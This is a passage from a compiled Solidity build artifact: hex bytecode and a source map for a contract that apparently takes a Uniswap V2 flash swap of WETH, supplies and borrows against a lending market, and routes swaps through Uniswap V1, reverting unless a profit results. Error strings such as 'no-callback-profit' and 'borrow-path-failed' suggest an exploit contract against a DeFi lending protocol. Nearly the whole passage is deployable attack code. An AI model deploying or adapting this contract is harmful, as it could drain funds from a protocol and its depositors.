565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52602160045260245ffd5b5f82825260208201905092915050565b7f6261642d73656e646572000000000000000000000000000000000000000000005f82015250565b5f612b02600a83612abe565b9150612b0d82612ace565b602082019050919050565b5f6020820190508181035f830152612b2f81612af6565b9050919050565b5f612b40826127da565b9050919050565b612b5081612b36565b8114612b5a575f5ffd5b50565b5f81359050612b6b81612b47565b92915050565b5f5f60408385031215612b8757612b866127d2565b5b5f612b9485828601612b5d565b9250506020612ba585828601612853565b9150509250929050565b7f706169722d6f6e6c7900000000000000000000000000000000000000000000005f82015250565b5f612be3600983612abe565b9150612bee82612baf565b602082019050919050565b5f6020820190508181035f830152612c1081612bd7565b9050919050565b5f81519050612c258161280a565b92915050565b5f60208284031215612c4057612c3f6127d2565b5b5f612c4d84828501612c17565b91505092915050565b7f776574682d6d697373696e6700000000000000000000000000000000000000005f82015250565b5f612c8a600c83612abe565b9150612c9582612c56565b602082019050919050565b5f6020820190508181035f830152612cb781612c7e565b9050919050565b7f6c6f616e2d6d69736d61746368000000000000000000000000000000000000005f82015250565b5f612cf2600d83612abe565b9150612cfd82612cbe565b602082019050919050565b5f6020820190508181035f830152612d1f81612ce6565b9050919050565b5f81519050612d348161283d565b92915050565b5f60208284031215612d4f57612d4e6127d2565b5b5f612d5c84828501612d26565b91505092915050565b7f6d697373696e672d6c6f616e00000000000000000000000000000000000000005f82015250565b5f612d99600c83612abe565b9150612da482612d65565b602082019050919050565b5f6020820190508181035f830152612dc681612d8d565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f612e0482612834565b9150612e0f83612834565b9250828201905080821115612e2757612e26612dcd565b5b92915050565b7f73656c662d6f6e6c7900000000000000000000000000000000000000000000005f82015250565b5f612e61600983612abe565b9150612e6c82612e2d565b602082019050919050565b5f6020820190508181035f830152612e8e81612e55565b9050919050565b5f604082019050612ea85f830185612a41565b612eb56020830184612a69565b9392505050565b5f81519050919050565b5f81905092915050565b8281835e5f83830152505050565b5f612ee882612ebc565b612ef28185612ec6565b9350612f02818560208601612ed0565b80840191505092915050565b5f612f198284612ede565b915081905092915050565b7f776574682d737570706c792d6661696c656400000000000000000000000000005f82015250565b5f612f58601283612abe565b9150612f6382612f24565b602082019050919050565b5f6020820190508181035f830152612f8581612f4c565b9050919050565b7f63616c6c6261636b2d6d61726b65742d656d70747900000000000000000000005f82015250565b5f612fc0601583612abe565b9150612fcb82612f8c565b602082019050919050565b5f6020820190508181035f830152612fed81612fb4565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61302b82612834565b915061303683612834565b92508261304657613045612ff4565b5b828204905092915050565b7f626f72726f772d706174682d6661696c656400000000000000000000000000005f82015250565b5f613085601283612abe565b915061309082613051565b602082019050919050565b5f6020820190508181035f8301526130b281613079565b9050919050565b5f6130c382612834565b91506130ce83612834565b92508282039050818111156130e6576130e5612dcd565b5b92915050565b5f6130f682612834565b915061310183612834565b925082820261310f81612834565b9150828204841483151761312657613125612dcd565b5b5092915050565b7f6e6f2d756e69737761702d7631000000000000000000000000000000000000005f82015250565b5f613161600d83612abe565b915061316c8261312d565b602082019050919050565b5f6020820190508181035f83015261318e81613155565b9050919050565b7f6e6f2d63616c6c6261636b2d70726f66697400000000000000000000000000005f82015250565b5f6131c9601283612abe565b91506131d482613195565b602082019050919050565b5f6020820190508181035f8301526131f6816131bd565b9050919050565b5f819050919050565b5f819050919050565b5f61322961322461321f846131fd565b613206565b612834565b9050919050565b6132398161320f565b82525050565b5f6060820190506132525f830186612a69565b61325f6020830185613230565b61326c6040830184612a69565b949350505050565b7f696e73756666696369656e742d7265616c697a65642d776574680000000000005f82015250565b5f6132a8601a83612abe565b91506132b382613274565b602082019050919050565b5f6020820190508181035f8301526132d58161329c565b9050919050565b5f8115159050919050565b6132f0816132dc565b81146132fa575f5ffd5b50565b5f8151905061330b816132e7565b92915050565b5f60208284031215613326576133256127d2565b5b5f613333848285016132fd565b91505092915050565b7f7472616e736665722d6661696c656400000000000000000000000000000000005f82015250565b5f613370600f83612abe565b915061337b8261333c565b602082019050919050565b5f6020820190508181035f83015261339d81613364565b9050919050565b5f819050919050565b6133b6816133a4565b82525050565b5f6060820190506133cf5f830186612a41565b6133dc60208301856133ad565b6133e96040830184612a41565b949350505050565b5f5f5f5f5f5f5f5f5f6101208a8c03121561340f5761340e6127d2565b5b5f61341c8c828d016132fd565b995050602061342d8c828d01612d26565b985050604061343e8c828d01612c17565b975050606061344f8c828d01612d26565b96505060806134608c828d01612d26565b95505060a06134718c828d01612d26565b94505060c06134828c828d01612d26565b93505060e06134938c828d01612d26565b9250506101006134a58c828d01612d26565b9150509295985092959850929598565b7f6e6f2d76322d70616972000000000000000000000000000000000000000000005f82015250565b5f6134e9600a83612abe565b91506134f4826134b5565b602082019050919050565b5f6020820190508181035f830152613516816134dd565b9050919050565b5f82825260208201905092915050565b5f601f19601f8301169050919050565b5f61354782612ebc565b613551818561351d565b9350613561818560208601612ed0565b61356a8161352d565b840191505092915050565b5f6080820190506135885f830187612a69565b6135956020830186612a69565b6135a26040830185612a41565b81810360608301526135b4818461353d565b905095945050505050565b7f617070726f76652d6661696c65640000000000000000000000000000000000005f82015250565b5f6135f3600e83612abe565b91506135fe826135bf565b602082019050919050565b5f6020820190508181035f830152613620816135e7565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f6040820190506136675f830185612a41565b6136746020830184612a41565b9392505050565b5f6dffffffffffffffffffffffffffff82169050919050565b61369d8161367b565b81146136a7575f5ffd5b50565b5f815190506136b881613694565b92915050565b5f63ffffffff82169050919050565b6136d6816136be565b81146136e0575f5ffd5b50565b5f815190506136f1816136cd565b92915050565b5f5f5f6060848603121561370e5761370d6127d2565b5b5f61371b868287016136aa565b935050602061372c868287016136aa565b925050604061373d868287016136e3565b915050925092509256fea264697066735822122051b7059d0a1b1431e4150ac97cb8bfa9121f0506cdc2636b6f61000cd5d26f2564736f6c634300081e0033","sourceMap":"2363:14752:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;7574:768;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;6292:1106;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;4284:1807;;;;;;;;;;;;;:::i;:::-;;6097:189;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;4088:91;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;4185:93;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;7404:164;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;7574:768;7774:11;;;;;;;;;;;7760:25;;:10;:25;;;;:55;;;;7797:18;7789:26;;;;;;;;:::i;:::-;;:4;;;;;;;;;;;:26;;;;;;;;:::i;:::-;;;;7760:55;7831:7;7756:92;2503:42;7861:29;;:4;:29;;;;:52;;;;7908:4;7894:19;;:2;:19;;;;7861:52;7929:7;7857:89;7983:1;7960:20;;:24;7956:380;;;8052:1;8028:20;;:25;;;;;;;;;;;8082:7;8092:35;8103:11;;;;;;;;;;;8116:10;;8092;:35::i;:::-;8082:45;;8146:2;8141:100;;8191:1;8168:20;:24;;;;8217:9;8210:4;;:16;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;8141:100;7986:265;7956:380;;;8294:1;8271:20;:24;;;;8316:9;8309:4;;:16;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;7956:380;7574:768;;;;;;;;;:::o;6292:1106::-;6440:4;6422:23;;:6;:23;;;6414:46;;;;;;;;;;;;:::i;:::-;;;;;;;;;6472:20;6494:18;6527:4;;6516:36;;;;;;;:::i;:::-;6471:81;;;;6584:12;6570:26;;:10;:26;;;6562:48;;;;;;;;;;;;:::i;:::-;;;;;;;;;6621:14;6653:10;6638:33;;;:35;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;6621:52;;6683:14;6715:10;6700:33;;;:35;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;6683:52;;2700:42;6753:23;;:6;:23;;;:50;;;;2700:42;6780:23;;:6;:23;;;6753:50;6745:75;;;;;;;;;;;;:::i;:::-;;;;;;;;;6831:20;2700:42;6854:23;;:6;:23;;;:43;;6890:7;6854:43;;;6880:7;6854:43;6831:66;;6931:10;6915:12;:26;6907:52;;;;;;;;;;;;:::i;:::-;;;;;;;;;7031:10;2700:42;6977:35;;;7021:4;6977:50;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;:64;;6969:89;;;;;;;;;;;;:::i;:::-;;;;;;;;;7069:16;7088:27;7104:10;7088:15;:27::i;:::-;7069:46;;7125:39;7155:8;7125:29;:39::i;:::-;7174:28;7193:8;7174:18;:28::i;:::-;7213:17;7233:31;7253:10;7233:19;:31::i;:::-;7213:51;;7274:56;3576:10;7293:9;:36;;;;:::i;:::-;7274:18;:56::i;:::-;7340:51;2700:42;7369:10;7381:9;7340:13;:51::i;:::-;6404:994;;;;;;;6292:1106;;;;;:::o;4284:1807::-;4339:9;;;;;;;;;;;4364:7;4335:46;4402:4;4390:9;;:16;;;;;;;;;;;;;;;;;;4417;:14;:16::i;:::-;4466:1;4443:12;;:25;;;;;;;;;;;;;;;;;;4494:1;4478:13;:17;;;;4511:28;3057:42;4511:12;:28::i;:::-;4510:29;:61;;;;4544:27;2700:42;4544:12;:27::i;:::-;4543:28;4510:61;4587:7;4506:98;5816:24;5830:9;5816:13;:24::i;:::-;3576:10;5854:13;;:41;5850:78;5911:7;5850:78;5938:24;5952:9;5938:13;:24::i;:::-;3576:10;5976:13;;:41;5972:78;6033:7;5972:78;6060:24;6074:9;6060:13;:24::i;:::-;4284:1807;:::o;6097:189::-;6192:4;6170:27;;:10;:27;;;6162:49;;;;;;;;;;;;:::i;:::-;;;;;;;;;6221:32;6242:10;6221:20;:32::i;:::-;6263:16;:14;:16::i;:::-;6097:189;:::o;4088:91::-;4134:7;4160:12;;;;;;;;;;;4153:19;;4088:91;:::o;4185:93::-;4232:7;4258:13;;4251:20;;4185:93;:::o;7404:164::-;;;;;;;;;:::o;15370:279::-;15439:4;15456:7;15465:17;2503:42;15498:26;;15548:28;;;15578:5;15585:6;15525:67;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;15498:95;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;15455:138;;;;15610:32;15633:2;15637:4;15610:22;:32::i;:::-;15603:39;;;;15370:279;;;;:::o;10466:274::-;10529:16;10568:10;10557:21;;10588:69;2700:42;2503;10639:17;10588:12;:69::i;:::-;10675:35;2700:42;10701:8;10675:10;:35::i;:::-;10667:66;;;;;;;;;;;;:::i;:::-;;;;;;;;;10466:274;;;:::o;10746:1149::-;10828:18;3057:42;10849:36;;;2503:42;10849:59;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;10828:80;;10939:1;10926:10;:14;10918:48;;;;;;;;;;;;:::i;:::-;;;;;;;;;3057:42;10977:11;;:28;;;;;;;;;;;;;;;;;;11016:17;11049:3;11036:10;:16;;;;:::i;:::-;11016:36;;11079:1;11066:9;:14;11062:58;;11108:1;11096:13;;11062:58;11130:13;11146:1;11130:17;;11157:19;11196:4;11179:14;:21;;;;:::i;:::-;11157:43;;11228:5;11214:11;:19;:47;;;;;11251:10;11237:11;:24;11214:47;11210:97;;;11285:11;11277:19;;11210:97;11317:533;11337:5;11324:9;:18;11317:533;;11371:9;11358:10;:22;;;;11417:63;11444:9;11431:10;:22;;;;:::i;:::-;3645:2;11417:13;:63::i;:::-;11394:20;:86;;;;11501:18;11494:4;;:25;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;11534:7;11544:37;3057:42;11571:9;11544:10;:37::i;:::-;11534:47;;11602:9;11595:4;;:16;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;11630:2;:69;;;;;11690:9;3057:42;11636:36;;;11681:4;11636:51;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;:63;11630:69;11626:114;;;11719:7;;;;;;;11626:114;11771:1;11758:9;:14;11754:58;;11792:5;;;11754:58;11838:1;11825:14;;;;;:::i;:::-;;;11344:506;11317:533;;;11860:28;;;;;;;;;;:::i;:::-;;;;;;;;10746:1149;;:::o;11901:432::-;11966:17;11986:8;11966:28;;12004:13;12020:8;12004:24;;12039:288;12058:1;12046:9;:13;:26;;;;;12071:1;12063:5;:9;12046:26;12039:288;;;12100:9;12092:5;:17;12088:73;;;12137:9;12129:17;;12088:73;12179:34;2700:42;12207:5;12179:12;:34::i;:::-;12175:117;;;12246:5;12233:18;;;;;:::i;:::-;;;12269:8;;12175:117;12315:1;12306:10;;;;;:::i;:::-;;;12039:288;;;11956:377;;11901:432;:::o;16746:134::-;16817:7;16872:1;16865:3;16857:4;16845:9;:16;;;;:::i;:::-;16844:24;;;;:::i;:::-;16843:30;;;;:::i;:::-;16836:37;;16746:134;;;:::o;12339:1492::-;12413:19;2700:42;12435:35;;;12479:4;12435:50;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;12413:72;;12514:17;12499:11;:32;12495:69;;12547:7;;;12495:69;12574:16;2832:42;12593:30;;;3057:42;12593:46;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;12574:65;;12677:1;12657:22;;:8;:22;;;12649:48;;;;;;;;;;;;:::i;:::-;;;;;;;;;12708:20;3057:42;12731:36;;;12776:4;12731:51;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;12708:74;;12815:1;12800:12;:16;12792:47;;;;;;;;;;;;:::i;:::-;;;;;;;;;12850:57;3057:42;12879:8;12889:17;12850:12;:57::i;:::-;12918:17;12953:4;12938:12;:19;;;;:::i;:::-;12918:39;;12984:1;12971:9;:14;12967:58;;13013:1;13001:13;;12967:58;13040:9;13052:1;13040:13;;13035:634;3697:2;13055:1;:19;13035:634;;;2700:42;13109:35;;;13153:4;13109:50;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;13095:64;;13192:17;13177:11;:32;13173:76;13229:5;13173:76;3057:42;13278:36;;;13323:4;13278:51;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;13263:66;;13363:1;13347:12;:17;13343:61;13384:5;13343:61;13434:12;13422:9;:24;13418:87;;;13478:12;13466:24;;13418:87;13538:8;13519:48;;;13568:9;13579:1;13600;13582:15;:19;;;;:::i;:::-;13519:83;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;13616:13;:11;:13::i;:::-;13657:1;13643:15;;;;;13076:3;;;;;;;13035:634;;;;2700:42;13693:35;;;13737:4;13693:50;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;13679:64;;13776:17;13761:11;:32;;13753:71;;;;;;;;;;;;:::i;:::-;;;;;;;;;12403:1428;;;;12339:1492;;:::o;16205:299::-;16291:12;16305:17;16326:5;:10;;16390:2;16394:6;16337:64;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;16326:76;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;16290:112;;;;16420:7;:57;;;;;16447:1;16432:4;:11;:16;:44;;;;16463:4;16452:24;;;;;;;;;;;;:::i;:::-;16432:44;16420:57;16412:85;;;;;;;;;;;;:::i;:::-;;;;;;;;;16280:224;;16205:299;;;:::o;16886:227::-;2614:42;16931:31;;;16971:4;3395:31;17006:4;16931:81;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2614:42;17022:31;;;17062:4;3482:34;17100:4;17022:84;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;16886:227::o;14623:167::-;14683:4;14700:16;2503:42;14728:20;;;14749:5;14728:27;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;14699:56;;;;;;;;;;14772:11;14765:18;;;14623:167;;;:::o;8348:227::-;8411:7;8431:4;8423:18;;8465:30;;;8497:10;8442:66;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8423:86;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8410:99;;;8524:2;8519:50;;8542:16;:14;:16::i;:::-;8519:50;8400:175;8348:227;:::o;8581:474::-;8650:12;8665:28;8682:10;8665:16;:28::i;:::-;8650:43;;8727:1;8711:18;;:4;:18;;;8703:41;;;;;;;;;;;;:::i;:::-;;;;;;;;;8755:14;8787:4;8772:27;;;:29;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;8755:46;;8811:18;2700:42;8832:23;;:6;:23;;;:40;;8871:1;8832:40;;;8858:10;8832:40;8811:61;;8882:18;2700:42;8903:23;;:6;:23;;;:40;;8933:10;8903:40;;;8929:1;8903:40;8882:61;;8969:4;8954:25;;;8980:10;8992;9012:4;9030;9036:10;9019:28;;;;;;;;;:::i;:::-;;;;;;;;;;;;;8954:94;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8640:415;;;;8581:474;:::o;14021:596::-;14066:13;:11;:13::i;:::-;14090:19;2700:42;14112:35;;;14156:4;14112:50;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;14090:72;;14190:1;14176:11;:15;14172:135;;;2700:42;14207:12;;:28;;;;;;;;;;;;;;;;;;14265:11;14249:13;:27;;;;14290:7;;;14172:135;14317:23;3057:42;14343:36;;;14388:4;14343:51;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;14317:77;;14426:1;14408:15;:19;14404:144;;;3057:42;14443:12;;:29;;;;;;;;;;;;;;;;;;14502:15;14486:13;:31;;;;14531:7;;;;14404:144;14581:1;14558:12;;:25;;;;;;;;;;;;;;;;;;14609:1;14593:13;:17;;;;14056:561;;14021:596;:::o;15655:220::-;15738:4;15759:2;15758:3;:23;;;;15779:2;15765:4;:11;:16;15758:23;15754:66;;;15804:5;15797:12;;;;15754:66;15867:1;15847:4;15836:27;;;;;;;;;;;;:::i;:::-;:32;15829:39;;15655:220;;;;;:::o;15881:318::-;15971:12;15985:17;16018:5;:10;;16081:7;16090:6;16029:68;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;16018:80;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;15970:128;;;;16116:7;:57;;;;;16143:1;16128:4;:11;:16;:44;;;;16159:4;16148:24;;;;;;;;;;;;:::i;:::-;16128:44;16116:57;16108:84;;;;;;;;;;;;:::i;:::-;;;;;;;;;15960:239;;15881:318;;;:::o;14796:279::-;14865:4;14882:7;14891:17;2503:42;14924:26;;14974:28;;;15004:5;15011:6;14951:67;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;14924:95;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;14881:138;;;;15036:32;15059:2;15063:4;15036:22;:32::i;:::-;15029:39;;;;14796:279;;;;:::o;16510:230::-;16595:7;16634:1;16618:12;:17;16614:56;;16658:1;16651:8;;;;16614:56;16701:7;16686:12;:22;:47;;16721:12;16686:47;;;16711:7;16686:47;16679:54;;16510:230;;;;;:::o;15081:283::-;15152:4;15169:7;15178:17;2503:42;15211:26;;15261:30;;;15293:5;15300:6;15238:69;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;15211:97;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;15168:140;;;;15325:32;15348:2;15352:4;15325:22;:32::i;:::-;15318:39;;;;15081:283;;;;:::o;13837:178::-;13879:18;13900:21;13879:42;;13948:1;13935:10;:14;13931:78;;;2700:42;13965:12;;;13985:10;13965:33;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;13931:78;13869:146;13837:178::o;9061:1399::-;9133:16;9161:25;:45;;;;;;;;3137:42;9161:45;;;;;;;;3218:42;9161:45;;;;;;;;3299:42;9161:45;;;;;;;;;9216:19;9251:9;9263:1;9251:13;;9246:576;9270:14;9266:1;:18;9246:576;;;9305:12;2964:42;9320:26;;;2700:42;9362:7;9370:1;9362:10;;;;;;;:::i;:::-;;;;;;9320:53;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;9305:68;;9407:1;9391:18;;:4;:18;;;9387:65;;9429:8;;;9387:65;9467:16;9485;9521:4;9506:32;;;:34;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;9466:74;;;;;9554:19;2700:42;9576:46;;9591:4;9576:27;;;:29;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;:46;;;:68;;9636:8;9576:68;;;9625:8;9576:68;9554:90;;;;9677:13;9662:11;:28;;:57;;;;;9708:11;9694;:25;9662:57;9658:154;;;9753:11;9739:25;;9793:4;9782:15;;9658:154;9291:531;;;;9246:576;9286:3;;;;;;;9246:576;;;;9856:1;9836:22;;:8;:22;;;9832:68;;9874:15;;;;9832:68;9915:9;9927:1;9915:13;;9910:544;9934:14;9930:1;:18;9910:544;;;9969:12;2964:42;9984:26;;;2700:42;10026:7;10034:1;10026:10;;;;;;;:::i;:::-;;;;;;9984:53;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;9969:68;;10071:1;10055:18;;:4;:18;;;10051:65;;10093:8;;;10051:65;10131:16;10149;10185:4;10170:32;;;:34;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;10130:74;;;;;10218:19;2700:42;10240:46;;10255:4;10240:27;;;:29;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;:46;;;:68;;10300:8;10240:68;;;10289:8;10240:68;10218:90;;;;10340:11;10326;:25;10322:122;;;10385:11;10371:25;;10425:4;10414:15;;10322:122;9955:499;;;;9910:544;9950:3;;;;;;;9910:544;;;;9151:1309;;9061:1399;;;;:::o;88:117:1:-;197:1;194;187:12;211:117;320:1;317;310:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:139::-;742:5;780:6;767:20;758:29;;796:33;823:5;796:33;:::i;:::-;696:139;;;;:::o;841:77::-;878:7;907:5;896:16;;841:77;;;:::o;924:122::-;997:24;1015:5;997:24;:::i;:::-;990:5;987:35;977:63;;1036:1;1033;1026:12;977:63;924:122;:::o;1052:139::-;1098:5;1136:6;1123:20;1114:29;;1152:33;1179:5;1152:33;:::i;:::-;1052:139;;;;:::o;1197:117::-;1306:1;1303;1296:12;1320:117;1429:1;1426;1419:12;1443:117;1552:1;1549;1542:12;1579:552;1636:8;1646:6;1696:3;1689:4;1681:6;1677:17;1673:27;1663:122;;1704:79;;:::i;:::-;1663:122;1817:6;1804:20;1794:30;;1847:18;1839:6;1836:30;1833:117;;;1869:79;;:::i;:::-;1833:117;1983:4;1975:6;1971:17;1959:29;;2037:3;2029:4;2021:6;2017:17;2007:8;2003:32;2000:41;1997:128;;;2044:79;;:::i;:::-;1997:128;1579:552;;;;;:::o;2137:1453::-;2263:6;2271;2279;2287;2295;2303;2311;2319;2368:3;2356:9;2347:7;2343:23;2339:33;2336:120;;;2375:79;;:::i;:::-;2336:120;2495:1;2520:53;2565:7;2556:6;2545:9;2541:22;2520:53;:::i;:::-;2510:63;;2466:117;2622:2;2648:53;2693:7;2684:6;2673:9;2669:22;2648:53;:::i;:::-;2638:63;;2593:118;2750:2;2776:53;2821:7;2812:6;2801:9;2797:22;2776:53;:::i;:::-;2766:63;;2721:118;2878:2;2904:53;2949:7;2940:6;2929:9;2925:22;2904:53;:::i;:::-;2894:63;;2849:118;3034:3;3023:9;3019:19;3006:33;3066:18;3058:6;3055:30;3052:117;;;3088:79;;:::i;:::-;3052:117;3201:64;3257:7;3248:6;3237:9;3233:22;3201:64;:::i;:::-;3183:82;;;;2977:298;3342:3;3331:9;3327:19;3314:33;3374:18;3366:6;3363:30;3360:117;;;3396:79;;:::i;:::-;3360:117;3509:64;3565:7;3556:6;3545:9;3541:22;3509:64;:::i;:::-;3491:82;;;;3285:298;2137:1453;;;;;;;;;;;:::o;3596:963::-;3693:6;3701;3709;3717;3725;3774:3;3762:9;3753:7;3749:23;3745:33;3742:120;;;3781:79;;:::i;:::-;3742:120;3901:1;3926:53;3971:7;3962:6;3951:9;3947:22;3926:53;:::i;:::-;3916:63;;3872:117;4028:2;4054:53;4099:7;4090:6;4079:9;4075:22;4054:53;:::i;:::-;4044:63;;3999:118;4156:2;4182:53;4227:7;4218:6;4207:9;4203:22;4182:53;:::i;:::-;4172:63;;4127:118;4312:2;4301:9;4297:18;4284:32;4343:18;4335:6;4332:30;4329:117;;;4365:79;;:::i;:::-;4329:117;4478:64;4534:7;4525:6;4514:9;4510:22;4478:64;:::i;:::-;4460:82;;;;4255:297;3596:963;;;;;;;;:::o;4565:329::-;4624:6;4673:2;4661:9;4652:7;4648:23;4644:32;4641:119;;;4679:79;;:::i;:::-;4641:119;4799:1;4824:53;4869:7;4860:6;4849:9;4845:22;4824:53;:::i;:::-;4814:63;;4770:117;4565:329;;;;:::o;4900:118::-;4987:24;5005:5;4987:24;:::i;:::-;4982:3;4975:37;4900:118;;:::o;5024:222::-;5117:4;5155:2;5144:9;5140:18;5132:26;;5168:71;5236:1;5225:9;5221:17;5212:6;5168:71;:::i;:::-;5024:222;;;;:::o;5252:118::-;5339:24;5357:5;5339:24;:::i;:::-;5334:3;5327:37;5252:118;;:::o;5376:222::-;5469:4;5507:2;5496:9;5492:18;5484:26;;5520:71;5588:1;5577:9;5573:17;5564:6;5520:71;:::i;:::-;5376:222;;;;:::o;5604:180::-;5652:77;5649:1;5642:88;5749:4;5746:1;5739:15;5773:4;5770:1;5763:15;5790:169;5874:11;5908:6;5903:3;5896:19;5948:4;5943:3;5939:14;5924:29;;5790:169;;;;:::o;5965:160::-;6105:12;6101:1;6093:6;6089:14;6082:36;5965:160;:::o;6131:366::-;6273:3;6294:67;6358:2;6353:3;6294:67;:::i;:::-;6287:74;;6370:93;6459:3;6370:93;:::i;:::-;6488:2;6483:3;6479:12;6472:19;;6131:366;;;:::o;6503:419::-;6669:4;6707:2;6696:9;6692:18;6684:26;;6756:9;6750:4;6746:20;6742:1;6731:9;6727:17;6720:47;6784:131;6910:4;6784:131;:::i;:::-;6776:139;;6503:419;;;:::o;6928:104::-;6973:7;7002:24;7020:5;7002:24;:::i;:::-;6991:35;;6928:104;;;:::o;7038:138::-;7119:32;7145:5;7119:32;:::i;:::-;7112:5;7109:43;7099:71;;7166:1;7163;7156:12;7099:71;7038:138;:::o;7182:155::-;7236:5;7274:6;7261:20;7252:29;;7290:41;7325:5;7290:41;:::i;:::-;7182:155;;;;:::o;7343:490::-;7419:6;7427;7476:2;7464:9;7455:7;7451:23;7447:32;7444:119;;;7482:79;;:::i;:::-;7444:119;7602:1;7627:61;7680:7;7671:6;7660:9;7656:22;7627:61;:::i;:::-;7617:71;;7573:125;7737:2;7763:53;7808:7;7799:6;7788:9;7784:22;7763:53;:::i;:::-;7753:63;;7708:118;7343:490;;;;;